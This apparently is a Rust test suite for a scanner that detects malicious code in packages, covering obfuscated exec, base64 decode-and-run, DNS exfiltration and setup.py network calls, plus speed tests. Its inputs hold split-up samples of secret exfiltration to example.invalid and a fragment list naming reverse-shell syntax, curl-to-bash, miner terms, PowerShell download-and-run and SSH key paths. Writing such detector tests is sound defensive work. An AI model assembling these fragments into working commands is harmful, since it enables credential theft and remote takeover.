            .is_some()
        );
        assert!(
            first_hit(
                guarddog(),
                "lib/a.js",
                "const r = require('fs');",
                "threat_runtime_obfuscation_hidden_code"
            )
            .is_none()
        );
        assert!(
            first_hit(
                guarddog(),
                "lib/a.py",
                &text,
                "threat_runtime_obfuscation_hidden_code"
            )
            .is_none()
        );
    }

    #[test]
    fn base64exec_hits_a_decode_then_run_in_the_full_set_only() {
        let text = j(&[
            "import base64\nblob = 'eA=='\nex",
            "ec(base64.b64",
            "decode(blob))\n",
        ]);
        let hit = first_hit(
            full(),
            "main.py",
            &text,
            "threat_runtime_obfuscation_base64exec",
        )
        .unwrap();
        assert_eq!(hit.severity, "high");
        // Its specificity is medium, so the enabled set leaves it to the payload rules.
        assert!(
            first_hit(
                guarddog(),
                "main.py",
                &text,
                "threat_runtime_obfuscation_base64exec"
            )
            .is_none()
        );
    }

    #[test]
    fn dns_exfil_hits_data_built_into_a_lookup_name() {
        let text = j(&[
            "import socket\nsocket.getadd",
            "rinfo(f\"{secret}.example.invalid\", 80)\n",
        ]);
        let hit = first_hit(guarddog(), "tool.py", &text, "threat_network_dns_exfil").unwrap();
        assert_eq!(hit.line, 2);
        assert!(
            first_hit(
                guarddog(),
                "tool.py",
                "socket.getaddrinfo('example.invalid', 80)",
                "threat_network_dns_exfil"
            )
            .is_none()
        );
    }

    #[test]
    fn setup_py_rules_fire_only_on_a_setup_file() {
        let text = j(&[
            "import requests\nfrom setuptools import setup\nsetup(name='x')\nrequests.po",
            "st('https://example.invalid')\n",
        ]);
        let names = |p: &str| -> Vec<String> {
            guarddog()
                .eval(&ctx(p, &text))
                .into_iter()
                .map(|h| h.rule)
                .collect()
        };
        assert!(names("setup.py").contains(&"threat_setup_suspicious_imports".to_string()));
        assert!(names("sub/setup.py").contains(&"threat_setup_suspicious_imports".to_string()));
        assert!(!names("lib/other.py").contains(&"threat_setup_suspicious_imports".to_string()));
    }

    const FRAGMENTS: &[&str] = &[
        "os.",
        "system",
        "popen",
        "(",
        ")",
        "'",
        "\"",
        "curl",
        "wget",
        " | ",
        "bash",
        "sh",
        "&&",
        "chmod",
        "subprocess",
        ".run",
        "exec",
        "eval",
        "new Function",
        "fetch",
        "https://",
        "atob",
        "Buffer.from",
        "'base64'",
        "base64.b64decode",
        "import ",
        "socket",
        ".getaddrinfo",
        "f'",
        ".format(",
        "global",
        "[",
        "]",
        "= require",
        "setup(",
        "from setuptools import",
        "requests",
        "urllib",
        "\n",
        "\n",
        "\n",
        "    ",
        "\t",
        "   ",
        "x",
        "y1",
        "_",
        "-",
        "def f():",
        "console.log",
        "nslookup ",
        "$HOME",
        "/dev/tcp/",
        "bash -i >& ",
        "xmrig",
        "stratum",
        "hashrate",
        "nonce",
        "miner",
        "powershell",
        " -enc ",
        "IEX",
        "WebRequest",
        "\\",
        "{",
        "}",
        "ev",
        "al(",
        "chr(",
        "map(chr,",
        "join(",
        ".bashrc",
        "w",
        "'w'",
        "open(",
        ".ssh/id_rsa",
    ];

    const PATHS: &[&str] = &[
        "a.py",
        "setup.py",
        "pkg/setup.py",
        "a.js",
        "a.ts",
        "a.go",
        "a.rb",
        "a.sh",
        "a.rs",
        "a.pth",
        "notes.txt",
    ];

    proptest! {
        #![proptest_config(ProptestConfig { cases: 400, ..ProptestConfig::default() })]
        #[test]
        fn prefilter_gives_the_same_hits_as_brute_force(
            parts in prop::collection::vec(prop::sample::select(FRAGMENTS), 0..80),
            path in prop::sample::select(PATHS),
        ) {
            let text = parts.concat();
            for set in [full(), guarddog()] {
                let f = ctx(path, &text);
                prop_assert_eq!(set.eval(&f), set.eval_brute_force(&f));
            }
        }
    }

    #[test]
    fn ten_mb_of_code_evaluates_under_one_second_release() {
        if cfg!(debug_assertions) {
            return;
        }
        let unit = "const fs = require('fs');\nfunction add(a, b) { return a + b; }\n\
                    let s = new Date().toISOString(); // exec and eval are only words here\n\
                    exports.run = async () => { await get(url); console.log('done', s); };\n\
                    import os\nfor item in items: print(os.path.join(base, item), 'curl')\n\
                    class Foo(object):\n    def bar(self, x):\n        return self.baz(x) + len(x)\n";
        let block = unit.repeat((2 << 20) / unit.len() + 1);
        let block = &block[..2 << 20];
        let paths = ["a.py", "b.js", "c.py", "d.ts", "e.go"];
        let start = Instant::now();
        let mut hit_count = 0;
        for p in paths {
            hit_count += guarddog().eval(&ctx(p, block)).len();
        }
        let took = start.elapsed();
        assert!(
            took.as_millis() < 1000,
            "10 MB took {took:?} ({hit_count} hits)"
        );
    }

    #[test]
    fn a_two_mb_minified_line_full_of_candidates_stays_fast_release() {
        if cfg!(debug_assertions) {
            return;
        }
        let unit = j(&[
            "var a=cu",
            "rl x;ex",
            "ec(y);ev",
            "al(z);new Func",
            "tion(q);os.sys",
            "tem(s);",
        ]);
        let line = unit.repeat((2 << 20) / unit.len() + 1);
        let start = Instant::now();
        for p in ["a.py", "b.js"] {
            guarddog().eval(&ctx(p, &line));
        }
        let took = start.elapsed();
        assert!(took.as_millis() < 1000, "2 MB on one line took {took:?}");
    }
}
